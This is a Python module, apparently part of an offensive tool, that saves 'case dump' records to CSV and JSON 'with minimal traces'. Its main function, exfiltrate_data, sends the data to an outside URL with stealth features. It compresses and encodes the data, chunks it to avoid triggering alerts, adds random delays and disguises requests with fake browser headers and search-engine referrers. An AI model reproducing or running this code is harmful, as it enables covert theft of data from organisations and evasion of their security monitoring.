# modules/exporter.py
import csv
import json
import os
import requests
import gzip
import time
import base64
import random
import string
from urllib.parse import urlparse

def save_to_csv(data, path="output/case_dump.csv"):
    """Save data to CSV with minimal traces"""
    if not data:
        return False
    
    try:
        directory = os.path.dirname(path)
        if directory:
            os.makedirs(directory, exist_ok=True)
        
        # Collect all keys for all items to ensure complete headers
        all_keys = set()
        for item in data:
            all_keys.update(item.keys())
        
        # Remove internal tracking keys
        for key in list(all_keys):
            if key.startswith('_'):
                all_keys.remove(key)
        
        keys = sorted(list(all_keys))
        
        with open(path, "w", newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=keys, extrasaction='ignore')
            writer.writeheader()
            writer.writerows(data)
        
        return True
    except Exception:
        return False

def save_to_json(data, path="output/case_dump.json"):
    """Save data to JSON with minimal traces"""
    if not data:
        return False
    
    try:
        directory = os.path.dirname(path)
        if directory:
            os.makedirs(directory, exist_ok=True)
        
        # Remove internal tracking keys to clean up output
        clean_data = []
        for item in data:
            clean_item = {}
            for key, value in item.items():
                if not key.startswith('_'):
                    clean_item[key] = value
            clean_data.append(clean_item)
        
        with open(path, "w", encoding='utf-8') as f:
            json.dump(clean_data, f)
        
        return True
    except Exception:
        return False

def exfiltrate_data(data, target_url, max_retries=3):
    """Exfiltrate data with enhanced stealth features"""
    if not data:
        return False
    
    # Compress and encode data to minimize transfer time
    try:
        # Generate a random boundary string for multipart data
        boundary = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        # Compress data to reduce transfer size
        compressed_data = gzip.compress(json.dumps(data).encode())
        encoded_data = base64.b64encode(compressed_data).decode()
        
        # Split into chunks to avoid large transfers that might trigger alerts
        chunk_size = 1024 * 512  # 512KB chunks
        total_chunks = (len(encoded_data) + chunk_size - 1) // chunk_size
        
        # Add random session ID to correlate chunks
        session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        
        success = True
        for i in range(total_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, len(encoded_data))
            chunk = encoded_data[start:end]
            
            payload = {
                "data": chunk,
                "session": session_id,
                "part": i + 1,
                "total": total_chunks,
                "compression": "gzip",
                "encoding": "base64",
                "timestamp": int(time.time()),
                "count": len(data)
            }
            
            retry_count = 0
            chunk_success = False
            
            while retry_count < max_retries and not chunk_success:
                try:
                    # Parse URL to validate
                    parsed_url = urlparse(target_url)
                    if not all([parsed_url.scheme, parsed_url.netloc]):
                        return False
                    
                    # Add random delay between chunks
                    if i > 0:
                        time.sleep(random.uniform(1.0, 3.0))
                    
                    # Use common headers that don't stand out
                    headers = {
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
                    
                    # Add random referrer occasionally
                    if random.random() < 0.3:
                        common_referrers = [
                            "https://www.google.com/",
                            "https://www.bing.com/",
                            "https://www.office.com/"
                        ]
                        headers["Referer"] = random.choice(common_referrers)
                    
                    response = requests.post(
                        target_url,
                        json=payload,
                        timeout=30,
                        headers=headers
                    )
                    
                    if response.status_code in [200, 201, 202, 204]:
                        chunk_success = True
                    else:
                        retry_count += 1
                        time.sleep((2 ** retry_count) + random.uniform(0, 1))
                
                except requests.RequestException:
                    retry_count += 1
                    time.sleep((2 ** retry_count) + random.uniform(0, 1))
            
            if not chunk_success:
                success = False
                break
        
        return success
        
    except Exception:
        return False